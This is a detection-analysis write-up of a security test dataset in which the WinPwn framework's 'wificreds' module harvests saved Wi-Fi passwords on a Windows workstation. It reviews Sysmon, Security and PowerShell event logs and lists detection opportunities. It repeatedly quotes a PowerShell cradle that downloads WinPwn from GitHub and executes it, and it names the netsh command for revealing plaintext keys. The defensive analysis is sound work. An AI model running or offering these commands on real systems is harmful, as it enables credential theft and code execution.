# T1555-7: Credentials from Password Stores — WinPwn: Loot Local Credentials via Wi-Fi Credentials

## Technique Context

T1555 covers credential theft from password stores. This test uses the WinPwn PowerShell framework's `wificreds` function to extract Wi-Fi pre-shared keys stored by the Windows WLAN AutoConfig service. Windows stores Wi-Fi profiles and their associated passwords in XML files under `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\<interface-GUID>\`. The stored profiles contain the network SSID and the password in either encrypted form (requiring DPAPI or admin access to decrypt) or, for some profile types, accessible in plaintext to privileged users.

WinPwn's `wificreds` module typically uses `netsh wlan show profiles` to enumerate known networks and `netsh wlan show profile name="<SSID>" key=clear` to extract plaintext pre-shared keys. This technique does not require any third-party binaries — it relies on the built-in `netsh` utility. Wi-Fi credentials are valuable for lateral movement to adjacent wireless network segments or for pivot to home/branch networks accessible from a compromised corporate device.

The WinPwn framework is downloaded at runtime: `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`. This test ran on ACME-WS06 with Defender disabled.

## What This Dataset Contains

The dataset contains 171 total events: 41 Sysmon events, 125 PowerShell operational events, 4 Security events, and 1 Application event.

**Sysmon EID 1 (Process Create)** captures the attack execution:

```
CommandLine: "powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
wificreds -consoleoutput -noninteractive}
CurrentDirectory: C:\Windows\TEMP\
User: NT AUTHORITY\SYSTEM
IntegrityLevel: System
```

The WinPwn URL is identical across T1555-6, T1555-7, and T1555-8 — the same commit hash, the same delivery cradle, only the function name changes. This reflects the WinPwn architecture: one framework, multiple modules.

The ART test framework `whoami.exe` check appears as the second Sysmon EID 1.

**Security EID 4688** captures four process creation events. The attack command line appears in full:

```
Process Command Line: "powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
wificreds -consoleoutput -noninteractive}
```

**Sysmon EID 7 (Image Load)** captures 25 events. **EID 10 (Process Access)** captures 4 events. **EID 17 (Pipe Create)** captures 3 events. **EID 11 (File Create)** captures 3 events.

The eid_breakdown shows 1 EID 22 (DNS Query) and 1 EID 3 (Network Connection) outside the sample window, confirming the GitHub download was recorded.

**PowerShell EID 4104** captures 120 script block events plus 4 EID 4103 events and 1 EID 4100 error event.

**Application EID 15** (1 event) appears in the channel statistics but is not in the sampled events.

## What This Dataset Does Not Contain

**No `netsh` process creation events.** If WinPwn's `wificreds` function uses `netsh wlan show profile ... key=clear` to extract Wi-Fi passwords, `netsh.exe` should appear as a child process. Its absence from the sampled Sysmon EID 1 events means either the function is implemented differently (using PowerShell cmdlets or WLAN API calls directly), or the `netsh` executions occurred but fell outside the 20-event sample window. The Sysmon eid_breakdown shows only 4 EID 1 events total, which accounts for `whoami` (×2 across the two test framework checks) and the PowerShell attack command (×1), leaving only 1 additional process creation — not consistent with multiple `netsh` calls.

**No Wi-Fi profile file access events.** Sysmon EID 11 captures file creation events, not file reads. If the `wificreds` module reads the XML profile files directly, those reads would not appear in the default Sysmon configuration.

**No Wi-Fi credential output.** Whatever WinPwn found — a list of SSIDs and passwords, or an empty result if ACME-WS06 had no saved Wi-Fi profiles — is not in the event logs.

**The `wificreds` function body is not in sampled script block logs.** The WinPwn framework code would be present in non-sampled EID 4104 events.

## Assessment

T1555-7 is nearly identical in structure to T1555-6 — same framework, same delivery mechanism, different module. Event counts are nearly the same (T1555-6: 42 Sysmon, 125 PS, 4 Security; T1555-7: 41 Sysmon, 125 PS, 4 Security), confirming consistent telemetry collection across WinPwn module tests.

The distinction from T1555-6 is purely in the attack function (`wificreds` vs `lazagnemodule`) and the credential target (Wi-Fi profiles vs broad credential harvesting). For detection purposes, the primary observable difference is the function name in the command line.

Compared to the defended variant (37 Sysmon, 51 PowerShell, 10 Security), the undefended run proceeds to completion (125 PowerShell events), consistent with the full WinPwn module executing without interruption.

The absence of `netsh` process creation events is noteworthy. If `wificreds` operates entirely within PowerShell (using Windows WLAN API via .NET or P/Invoke), there would be no child process for `netsh.exe`, and the Wi-Fi credential extraction would be entirely invisible except in the script block logs. This would make it stealthier than command-line-based approaches.

## Detection Opportunities Present in This Data

**Sysmon EID 1** captures the complete WinPwn download cradle with `wificreds` as the function name. `wificreds` is a specific WinPwn function name that could be used as a detection string in script block or process creation monitoring.

**Security EID 4688** captures the identical command line.

**Sysmon EID 3 and EID 22** (confirmed present) capture the outbound connection to GitHub for the WinPwn framework download. As with T1555-6, this is a prerequisite event that precedes the credential access.

**PowerShell EID 4104** would contain the `wificreds` function implementation. If the function calls `netsh`, the `netsh` command would appear in the script block. If it uses Windows API calls directly, the API call patterns (e.g., WLAN API function names) would be visible in the script block text.

The WinPwn commit hash `121dcee26a7aca368821563cbe92b2b5638c5773` is a specific, stable indicator used across all three WinPwn tests (T1555-6, T1555-7, T1555-8) in this batch. Its presence in process creation or script block logs provides a high-confidence attribution to WinPwn specifically.
